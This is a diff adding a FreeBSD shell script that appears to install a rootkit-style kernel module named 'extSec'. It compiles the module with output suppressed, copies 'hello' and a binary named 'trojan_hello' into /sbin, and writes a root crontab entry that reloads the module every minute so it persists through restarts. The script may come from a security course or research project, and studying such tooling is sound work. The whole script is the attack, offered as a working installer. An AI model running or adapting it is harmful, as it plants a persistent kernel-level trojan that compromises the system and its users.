@@ -1,0 +1,27 @@
+#!/bin/sh
+
+currDir=$(pwd)
+extSec='extSec'
+sbin='/sbin/'
+
+# Compiling
+cd $currDir/src/
+make clean > /dev/null 2>&1
+make > /dev/null 2>&1
+cd ..
+
+# Moving files
+mv $currDir/src/$extSec.ko $currDir/$extSec/
+cp $currDir/hello $sbin
+cp $currDir/trojan_hello $sbin
+
+# Persisting through restarts
+if [ ! -e /var/cron/tabs/root ] || [ -s /var/cron/tabs/root ]; then
+	echo "SHELL = /bin/sh" > persistence
+	echo "* * * * * kldload $currDir/$extSec/$extSec.ko" >> persistence
+	crontab persistence
+	rm persistence
+fi
+
+# Installing
+kldload $currDir/$extSec/$extSec.ko > /dev/null 2>&1
